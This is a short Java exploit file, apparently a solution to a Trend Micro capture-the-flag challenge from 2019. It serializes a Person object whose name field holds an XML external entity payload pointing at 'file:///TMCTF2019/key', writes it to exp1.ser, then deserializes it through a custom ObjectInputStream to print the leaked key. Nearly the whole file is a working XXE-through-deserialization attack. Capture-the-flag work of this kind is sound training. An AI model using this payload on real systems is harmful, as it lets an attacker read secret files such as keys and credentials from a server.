package com.trendmicro;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class exp {
    public static void main(String args[]) throws Exception {
        String path = "exp1.ser";
        FileOutputStream fout = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fout);
        Person a = new Person("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///TMCTF2019/key\">]><tag>&xxe;</tag>");
        oos.writeObject(a);
        oos.close();
        FileInputStream fis = new FileInputStream(path);
        CustomOIS ois = new CustomOIS(fis);
        Person person = (Person)ois.readObject();
        System.out.println(person.name);
        ois.close();
    }
}
